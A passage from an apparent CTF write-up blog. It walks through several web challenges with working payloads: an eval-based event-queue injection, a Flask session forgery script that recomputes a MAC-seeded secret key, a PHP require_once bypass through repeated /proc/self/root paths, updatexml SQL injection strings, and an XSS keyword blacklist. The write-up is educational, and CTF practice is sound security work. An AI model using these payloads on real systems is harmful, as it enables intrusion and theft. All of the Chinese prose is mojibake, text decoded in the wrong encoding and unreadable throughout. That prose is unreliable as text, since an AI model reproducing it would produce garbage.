<span class="comment"># å¦‚æœeventçš„ç±»å‹æ˜¯åˆ—è¡¨ï¼Œé‚£ä¹ˆåŠ å…¥é˜Ÿåˆ—</span></span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event) <span class="comment"># äº‹ä»¶é˜Ÿåˆ—æ¥å…¥eventå…ƒç´ </span></span><br></pre></td></tr></table></figure>

<p>  -<code>get_mid_str</code>å‡½æ•°ç”¨äºåœ¨åé¢çš„<code>execute_event_loop</code>å‡½æ•°ä¸­æˆªå–ç”¨äºæ‰§è¡Œçš„å‡½æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):] <span class="comment"># è·å–prefixæ‰€åœ¨ç´¢å¼•åŠ ä¸Šprefixé•¿åº¦çš„å€¼</span></span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] <span class="comment"># è·å–postfixå‰é¢çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> haystack</span><br></pre></td></tr></table></figure>

<p>  -<code>execute_event_loop</code>å‡½æ•°ç”¨äºæ‰§è¡Œurlä¸­æˆ‘ä»¬ç”¨getä¼ å…¥çš„å‡½æ•°ï¼Œè€Œæˆ‘ä»¬æ‰€åˆ©ç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªå‡½æ•°ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œå¤šä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ©ç”¨trigger_eventå°†æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°æ”¾å…¥æ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œä½†æ˜¯ç”±äºevalå‡½æ•°ï¼Œæ‰€ä»¥è¦ç”¨%23ç»•è¿‡ï¼Œä¹‹åå†åœ¨æ¯ä¸ªè¦æ‰§è¡Œçš„å‡½æ•°ä¹‹é—´ç”¨#è¿›è¡Œåˆ†å‰²å°±å®ç°äº†å¤šå‡½æ•°è°ƒç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span> <span class="comment"># æ‰§è¡Œurlä¸Šé¢çš„actionå•¦å°±æ˜¯</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>: <span class="comment"># å½“é˜Ÿåˆ—é•¿åº¦å¤§äº0æ—¶</span></span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># è·å–å…ƒç´ </span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]  <span class="comment"># æˆªå–é˜Ÿåˆ— ç´¢å¼•ä¸º1ä¹‹åçš„å…ƒç´ </span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)): <span class="comment"># å¦‚æœå…ƒç´ ä¸æ˜¯ä»¥xxxä¸ºå¼€å¤´ï¼Œå°±è·³å‡ºå¾ªç¯ï¼Œæ‰¾ä¸‹ä¸€ä¸ªevent</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="comment"># è¿‡æ»¤è¢«ç¦æ­¢çš„å­—ç¬¦</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span> <span class="comment"># åˆ¤æ–­æ˜¯ä¸æ˜¯action</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>) <span class="comment"># è·å–:ä¹‹åå’Œ;ä¹‹å‰çš„å­—ç¬¦ä¸²</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>) <span class="comment"># action;ä¹‹åçš„å­—ç¬¦ä¸² å¹¶ä»¥#ä¸ºåˆ†éš” è¿”å›åˆ—è¡¨</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>)) <span class="comment"># æ‰§è¡Œå‡½æ•° è¿™é‡Œè¦æ³¨æ„trigger_eventçš„ç»“å°¾ä¸æ˜¯handlerä¹Ÿä¸æ˜¯functionï¼Œæ‰€ä»¥å¦‚æœè¦è°ƒç”¨trigger_eventå‡½æ•°ï¼Œå°±è¦ç»•è¿‡</span></span><br><span class="line">                ret_val = event_handler(args) <span class="comment"># é»˜è®¤ä¸ºç¬¬ä¸€ä¸ª å³;åé¢çš„#å‰é¢çš„</span></span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val <span class="comment"># æ‰§è¡Œä¹‹åçš„å€¼æ”¾å…¥respä¸­</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>  -<code>buy_handler</code>å‡½æ•°è´­ä¹°é’»çŸ³ï¼Œå‚æ•°ä¸ºä¹°çš„é’»çŸ³çš„ä¸ªæ•°ï¼Œç„¶åä¹°çš„ä¸ªæ•°åŠ å…¥sessionçš„num_itemsä¸­ï¼Œè¿™é‡Œçš„num_itemsåˆšå¥½å’Œåé¢çš„get_flagå‡½æ•°ç›¸åº”ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å®ç°num_itemsa&gt;=5ï¼Œä½†æ˜¯è¿˜è¦æ³¨æ„åœ¨<code>consume_point_function</code>å‡½æ•°ä¸­çš„æŠ¥é”™<code>RollBackException()</code>ï¼Œè¿™ä¸ªè¦æ±‚ä¸€æ¬¡è´­ä¹°çš„é’»çŸ³ä¸ªæ•°ä¸èƒ½è¶…è¿‡3ä¸ªï¼Œæ‰€ä»¥ä¸èƒ½ä¸€æ¬¡æ€§ä¹°5ä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ†æ¬¡æ•°è´­ä¹°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>  - åœ¨æœ€åçš„<code>get_flag_handler</code>å‡½æ•°ä¸­å¯ä»¥å‘ç°ï¼Œå¦‚æœä¹°åˆ°çš„é’»çŸ³ä¸ªæ•°å¤§äº5çš„è¯ï¼Œå°±å¯ä»¥æ‰§è¡Œtrigger_enentå’ŒFlAGå‡½æ•°å¾—åˆ°flagäº†ï¼Œå¹¶ä¸”trigger_eventå‡½æ•°ä¼šæŠŠå­—ç¬¦ä¸²æ”¾å…¥sessioné‡Œé¢çš„logä¸­ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡çœ‹sessionæ¥å¾—åˆ°flagï¼Œè€Œä»å‰é¢ä¹Ÿå¯ä»¥å‘ç°sessionè¢«åŠ å¯†äº†ï¼Œç›´æ¥ç”¨è„šæœ¬è§£å¯†å°±å¥½å•¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?action:trigger_event%<span class="number">23</span>;action:buy <span class="number">2</span>;%23action:buy <span class="number">3</span>;%23action:get_flag;%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/10a5781779e7402c8d844b331f2e37c4.png" alt="img"></p>
<p>base64è§£å¯†ä¹‹åå¾—åˆ°flag</p>
<h4 id="CISCN2019-Web4"><a href="#CISCN2019-Web4" class="headerlink" title="[CISCN2019]Web4"></a>[CISCN2019]Web4</h4><p>æ‰“å¼€é¡µé¢ï¼Œç‚¹å‡»ä¹‹åå‘ç°ç›´æ¥è½¬åˆ°äº†ç™¾åº¦çš„ç•Œé¢ï¼Œçœ‹urlå°±å¯ä»¥å‘ç°ç€æ‰‹ç‚¹äº†</p>
<p><img src="https://img-blog.csdnimg.cn/b1c62e623d6c469a8fc965deaa6ab527.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¯èƒ½å­˜åœ¨ssrfä¹‹ç±»çš„æ¼æ´ï¼Œç›´æ¥è¯•ç€æŸ¥çœ‹<code>/flag</code>ï¼Œä½†æ˜¯è¿”å›äº†hackerï¼Œè¯´æ˜flagè¢«banäº†</p>
<p>ä¹‹åæŸ¥çœ‹ä¸€äº›æ–‡ä»¶ä¹Ÿçœ‹ä¸å‡ºæœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œé‚£ä¹ˆå°±å…ˆæŠ“ä¸ªåŒ…å§</p>
<p>å‘ç°sessionçš„å€¼å¾ˆæƒ³jwtçš„æ ¼å¼</p>
<p><img src="https://img-blog.csdnimg.cn/69249a08114d405da99883377e9eac70.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£å°±ç›´æ¥å»ç”¨è„šæœ¬å¼ºåˆ¶è§£å¯†ä¸€ä¸‹çœ‹çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/3e1de7eb08a7468db3310c29453f2781.png" alt="img"></p>
<p>è§£å¯†ä¹‹åå‘ç°åé¢æ˜¯<code>www-data</code>ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½å°±æ˜¯æˆ‘ä»¬è¦ä¿®æ”¹sessionä¼ªé€ èº«ä»½ï¼Œæ‰æœ‰èµ„æ ¼è®¿é—®</p>
<p>ä½†æ˜¯ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œä¸€ä¸ªæ˜¯ä¸çŸ¥é“çœŸæ­£çš„ç”¨æˆ·æ˜¯ä»€ä¹ˆï¼Œç„¶åè¿˜æœ‰ä¸€ä¸ªæ˜¯ä¸çŸ¥é“åŠ å¯†çš„å¯†é’¥æ˜¯ä»€ä¹ˆï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥çŒœæµ‹å­˜åœ¨pythonæ–‡ä»¶ï¼Œä½†æ˜¯è¯¥æ€ä¹ˆæ‰èƒ½å¾—åˆ°æºç å‘¢</p>
<p>å› ä¸ºè¿™æ˜¯ä¸€ä¸ªflaskæ¡†æ¶ï¼Œä½†æ˜¯å°è¯•ä¹‹åè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæœ€åçœ‹äº†åˆ«äººçš„wp</p>
<p>ï¼ˆä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<p><img src="https://img-blog.csdnimg.cn/3c3a6404d09541cf8760f269c9039626.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±å¯ä»¥è¿›è¡Œå®¡è®¡å•¦ï¼Œæ ¹æ®å‰é¢æœ‰<code># encoding:utf-8</code>ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹æ˜¯python2çš„ç¯å¢ƒï¼ˆçº¯ä¸ªäººæ–¹æ³•</p>
<p>å®¡è®¡æºç ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°<code>flag</code>è·¯ç”±ï¼Œä¸”è¦å®ç°usernameä¸ºfuckæ‰èƒ½è¯»å–flagæ–‡ä»¶ï¼Œä½†æ˜¯æ¥ä¸‹å»è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¯†é’¥</p>
<p>é‡ç‚¹åœ¨äºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br></pre></td></tr></table></figure>

<p>ç™¾åº¦ä¹‹åå¯ä»¥çŸ¥é“ï¼Œrandom.seedé‡Œé¢çš„å€¼æ˜¯ç§å­ï¼Œå­˜åœ¨seedä¹‹åï¼Œå†æ‰§è¡Œrandomå‡½æ•°çš„æ—¶å€™ç”Ÿæˆçš„éšæœºæ•°çš„ä¼ªéšæœºæ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è·å–seedæ¥çŸ¥é“æˆ‘ä»¬éœ€è¦çš„éšæœºæ•°</p>
<p>æ‰€ä»¥ç°åœ¨çš„é‡ç‚¹åœ¨äº<code>uuid.getnode()</code>ï¼Œç™¾åº¦ä¹‹åå‘ç°è¿™ä¸ªæ˜¯ç”¨æ¥è·å–macåœ°å€ï¼ˆç‰©ç†åœ°å€ï¼‰çš„</p>
<p><img src="https://img-blog.csdnimg.cn/3e3d43e80fee488d9a095e83b4993943.png" alt="img"></p>
<p><a href="https://www.jianshu.com/p/b4102e3e3e96">https://www.jianshu.com/p/b4102e3e3e96</a></p>
<p><img src="https://img-blog.csdnimg.cn/643045d1767940b19f4e01dc5b6889b7.png" alt="img"></p>
<p>æ‰€ä»¥å¾—åˆ°äº†macåœ°å€ï¼ˆ<code>ae:f8:1f:75:7c:c0</code>ï¼‰ï¼Œè€Œseedé‡Œé¢æ˜¯åè¿›åˆ¶ï¼Œæ‰€ä»¥è¦å°†macåœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼š</p>
<p>expï¼šï¼ˆæ³¨æ„è¿™é‡Œè¦ç”¨python2ï¼Œå› ä¸ºpython3å’Œpython2ä¿ç•™çš„å°æ•°ä½æ•°ä¸åŒ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;ae:f8:1f:75:7c:c0&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp, <span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bba999b0f4094a2f8433a60f8fcb0599.png" alt="img"></p>
<p>ä¹‹åç›´æ¥å¯¹sessionåŠ å¯†ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/39ce5103162a43e9940c1c57276c6d34.png" alt="img"></p>
<p>ä¿®æ”¹sessionï¼Œå¹¶è®¿é—®flagè·¯ç”±å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/40cd32a3d29c4da581a02d6c697168b8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF-Make-PHP-Great-Again"><a href="#WMCTF-Make-PHP-Great-Again" class="headerlink" title="[WMCTF]Make PHP Great Again"></a>[WMCTF]Make PHP Great Again</h4><ul>
<li>require_onceç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«çš„é™åˆ¶</li>
</ul>
<p>æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">require_once <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  require_once $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»£ç å¾ˆçŸ­,çŸ¥è¯†ç‚¹æ˜¯ç»•è¿‡<code>require_once</code>ä¸èƒ½é‡å¤åŒ…å«çš„é™åˆ¶</p>
<p><a href="https://www.anquanke.com/post/id/213235#h2-0">åˆ†æ</a>ï¼ˆæ…¢æ…¢çœ‹</p>
<p><img src="https://img-blog.csdnimg.cn/9938dbfd17074c58a1b8492d7939a72c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF-babyWeb"><a href="#RootersCTF-babyWeb" class="headerlink" title="[RootersCTF]babyWeb"></a>[RootersCTF]babyWeb</h4><ul>
<li>ç®€å•çš„sqlæ³¨å…¥</li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œç›´æ¥å‘Šè¯‰äº†æˆ‘ä»¬banäº†<code>union|sleep|&#39;|&quot;| or |-|benchmark</code>ï¼Œéšä¾¿åœ¨æ¡†é‡Œè¾“å…¥æ•°å­—æ—¶ä¼šå‘ç°è¿™åº”è¯¥æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œæ‰€ä»¥è¢«banæ‰çš„å¼•å·æ²¡æœ‰å°è±¡</p>
<p><img src="https://img-blog.csdnimg.cn/f72394e1795f44f2bc5ea5632c7c0ed0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>è§£æ³•ä¸€ï¼šä¸‡èƒ½å¯†ç </strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 || 1=1 limit 0,1</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/8a484268e1104f23a9882f36374f1efd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>è§£æ³•äºŒï¼šæ‰‹æ³¨</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 order by 2</span><br><span class="line">1^updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),0x7e),1)</span><br><span class="line">1^updatexml(1,concat(0x7e,(select uniqueid from users),0x7e),1)</span><br><span class="line"># ~837461526918364526,123456789928466788~  </span><br></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æŸ¥è¯¢åˆ°çš„uniqueidçš„å€¼ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†</p>
<p>ï¼ˆæ³¨ï¼šè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯è¿‡æ»¤äº†å•å¼•å·åœ¨table_name=â€™usersâ€™ä¸­ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä»¥ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼‰</p>
<h4 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h4><p>æ‰“å¼€é¶æœºï¼Œæ— æ³•æ³¨å…¥ï¼Œä½†æ˜¯å¯ä»¥åœ¨feedbacké‡Œé¢å†™å†…å®¹</p>
<p><img src="https://img-blog.csdnimg.cn/93635349daab40f7936d1079951ed897.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>çœ‹äº†æºç ä¹‹åå¯ä»¥å‘ç°ä»£ç å—ï¼Œè¿™é‡Œçš„é»‘åå•æ˜¯è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢çš„ï¼Œé‚£æˆ‘ä»¬åœ¨è¢«è¿‡æ»¤çš„å­—ç¬¦ä¸²ä¸­é—´åŠ ä¸Šcookieå°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$feedback</span>))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;åé¦ˆä¸åˆæ³•&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$blacklist</span> = [<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;iframe&#x27;</span>,<span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;onload&#x27;</span>,<span class="string">&#x27;onerror&#x27;</span>,<span class="string">&#x27;srcdoc&#x27;</span>,<span class="string">&#x27;location&#x27;</span>,<span class="string">&#x27;svg&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;img&#x27;</span>,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;getElement&#x27;</span>,<span class="string">&#x27;document&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">		        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		            <span class="keyword">if</span>(stripos(<span class="variable">$feedback</span>,<span 